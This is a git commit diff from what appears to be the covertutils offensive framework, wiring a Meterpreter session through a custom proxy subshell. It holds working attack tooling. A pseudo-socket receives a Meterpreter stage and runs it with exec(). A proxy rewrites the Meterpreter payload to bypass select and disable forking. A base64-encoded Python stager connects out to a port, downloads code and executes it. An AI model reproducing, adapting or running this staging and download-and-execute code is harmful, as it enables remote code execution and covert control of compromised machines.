f234d58605a3701256df512bc5e67f2476490cb2
operatorequals <john.torakis@gmail.com>
2017-11-30 01:17:15 +0400

    Basic metepreter subshell proxy working

--- covertutils/payloads/generic/meterpreter.py
+++ covertutils/payloads/generic/meterpreter.py
@@ -8,8 +8,10 @@ def init( storage ) :
 	storage['meterpreter_ins'] = ""
 	storage['meterpreter_outs'] = Queue()
 
-	class PseudoSocket :
+	class PseudoSocket (object):
 		# pass
+		# socket
+
 		def __init__(self, queue = Queue(), buffer_ = bytearray()) :
 			self.buffer = buffer_
 			self.queue = queue
@@ -17,19 +19,32 @@ def init( storage ) :
 		def send( self, pkt ) :
 			print "PseudoSocket send(): '%s'" % pkt.encode('hex')
 			storage['meterpreter_outs'].put(pkt)
-			storage['meterpreter_outs']['COMMON']['handler'].preferred_send(pkt, 'meterpreter')
+			storage['COMMON']['handler'].preferred_send(pkt, 'meterpreter')
 
 		def recv ( self, buf_size ) :
 			print "PseudoSocket recv() - {"
-			while len(storage['meterpreter_ins']) < buf_size :
-				# print len(storage['meterpreter_ins']), '/', buf_size,
+			available_bytes = -1
+			prev = available_bytes
+			while available_bytes < buf_size :
+				available_bytes = len(storage['meterpreter_ins'])
+				if prev != available_bytes :
+					print available_bytes, '/', buf_size
+					prev == available_bytes
 				# print storage['meterpreter_ins'].encode('hex')
-				time.sleep(0.5)
+				time.sleep(0.2)
+			l = len(storage['meterpreter_ins'])
 			ret = storage['meterpreter_ins'][:buf_size]
+			# b1 = storage['meterpreter_ins'][0]
 			storage['meterpreter_ins'] = storage['meterpreter_ins'][buf_size:]
-			time.sleep(0.1)
-			# print ret
-			print "PseudoSocket recv() }"
+			# b2 = storage['meterpreter_ins'][0]
+			assert( len(ret) == buf_size )
+			# assert( b1 != b2 )
+			# time.sleep(0.1)
+			print "[+] recv: " + ret.encode('hex')
+			print "PseudoSocket recv(%d) from %d bytes }" % (buf_size, l)
+			print "Remaining '%d' bytes in recv buffer" % len(storage['meterpreter_ins'])
+			# print
+			assert ( l >= buf_size )
 			return ret
 
 		def close( self ) :
@@ -41,6 +56,9 @@ def init( storage ) :
 		# def getpeername( self ) :	return ("covertutils_server", 4444)
 		def getsockname( self ) :	return ("::", 4444)
 		def getpeername( self ) :	return ("::", 4444)
+		# def settimeout( self, timeout ) : return True
+
+		def empty( self ) : return len(storage['meterpreter_ins']) == 0
 
 
 	def meterpreter_stage( ) :
@@ -49,18 +67,19 @@ def init( storage ) :
 		s = PseudoSocket( queue = storage['meterpreter_outs'], buffer_ = storage['meterpreter_ins'] )
 		storage['socket'] = s
 		print "Getting 4 bytes"
-		l=struct.unpack('>I',s.recv(4))[0]
+		l=struct.unpack('<I',s.recv(4))[0]
 		print "Getting the rest %d bytes of Meterpreter" % l
 		d=s.recv(l)
-		# while len(d)<l:
-		# 	print "%d bytes to go!" % l
-		# 	d+=s.recv(l-len(d))
+		while len(d)<l:
+			print "%d bytes to go!" % l
+			d+=s.recv(l-len(d))
 		print "Executing Meterpreter main"
-		# meterpreter_main = str(d).replace('\x00','')
-		# meterpreter_main = str(d)[4:]
-		# meterpreter_main = str(d)
+
 		meterpreter_main = d
-		# print meterpreter_main[-30:]
+		# assert '\x00' not in meterpreter_main
+		# print "Null byte at: %d" % meterpreter_main.index('\x00')
+		print meterpreter_main[-30:]
+		print "[!] Goind to exec()!"
 		exec(meterpreter_main,{'s':s})
 		print "[+] Meterpreter Started!"
 
@@ -73,11 +92,13 @@ def init( storage ) :
 
 
 def work( storage, message ) :
-	print "[!] Meterpreter Handler Message Arrived!"
-	print message.encode('hex')
+	# print "[!] Meterpreter Handler Message Arrived!"
+	# print message.encode('hex')
+	# print message.encode('hex')
 	# print "Outs: ",
 	# print storage['meterpreter_outs']
 	storage['meterpreter_ins'] = storage['meterpreter_ins'] + message
+	# print storage['meterpreter_ins'][-30:]
 	# print "Message buffer: " + storage['meterpreter_ins']
 	# try :
 	# 	ret = storage['meterpreter_outs'].get(False)
@@ -89,7 +110,7 @@ def work( storage, message ) :
 	return ''
 '''
 
-!stage mload covertutils.payloads.generic.meterpreter
+!stage mload covertutils.payloads.generic.meterpreter; !python print "A"
 
 echo 'aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEyNy4wLjAuOScsNDQ0NikpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=' | python-win
 '''
--- covertutils/shells/subshells/meterpretersubshell.py
+++ covertutils/shells/subshells/meterpretersubshell.py
@@ -4,19 +4,43 @@ import socket
 import threading
 from time import sleep
 
+import struct
+
 
 def meterpreter_proxy( proxy_socket, instance ) :
 	print ("Started Meterpreter Proxy thread")
-	# b = 42245
-	b = 1024
+	b = 42231
+	# b = 4096
+	# b = 2048
 	while True :
 		# print "recv'ing",
 		resp = proxy_socket.recv(b)
 		# print "recv()'d %d bytes of data'" % b
-		print resp.encode('hex')
+		# if resp :
+			# print "[+] Received from Handler: " + resp.encode('hex')
+
+		if "#!/usr/bin/python" in resp :
+			print "[!]Injecting select.select bypass"
+			resp2 = resp
+			dummy_func = '''
+import select
+def dummy(*args, **kwargs) :
+	if s.empty() : return [],[],[]
+	return [s],[],[]
+select.select = dummy
+'''
+			resp2 = resp.replace("import select", dummy_func)
+			resp2 = resp2.replace("TRY_TO_FORK = True", "TRY_TO_FORK = False")
+			resp2 = resp2.replace("#!/usr/bin/python", 'print "[!!!] METERPRETER passed control!"')
+			resp2 = resp2.replace("DEBUGGING = False", "DEBUGGING = True")
+
+			l = len(resp2)
+			print "Final Length = %d" % l
+			resp = struct.pack("<I", l) + resp2[4:]
+
 		instance.handler.preferred_send( resp, instance.stream )
-		sleep(0.1)
-		# b = 8
+		# sleep(0.01)
+		b = 16655
 
 class MeterpreterShell ( SimpleSubShell ) :
 
@@ -24,7 +48,7 @@ class MeterpreterShell ( SimpleSubShell ) :
 # This is an Example Shell. It has a custom prompt, and reverses all input before sending to the stage.
 # 	"""
 
-	def __init__( self, stream, handler, queue_dict, base_shell, ignore_messages = set(), prompt_templ = "{stream}> ") :
+	def __init__( self, stream, handler, queue_dict, base_shell, ignore_messages = set(), prompt_templ = "{stream} < ") :
 		SimpleSubShell.__init__( self, stream, handler, queue_dict, base_shell, ignore_messages, prompt_templ )
 		"""A method that uses the `prompt_templ` argument
 		to reformat the prompt
@@ -32,9 +56,10 @@ class MeterpreterShell ( SimpleSubShell ) :
 		self.updatePrompt()
 
 		def meterpreter_send(message, instance) :
-			print ("Forwarding meterpreter message")
-			print "[!] '%s'" % message
+			print ("[+] Received from Agent {")
+			print "[!] '%s'" % message.encode('hex')
 			instance.proxy.send(message)
+			print "[+] Message Delivered to Handler! }"
 
 		print ("Creating Proxy socket")
 		self.proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
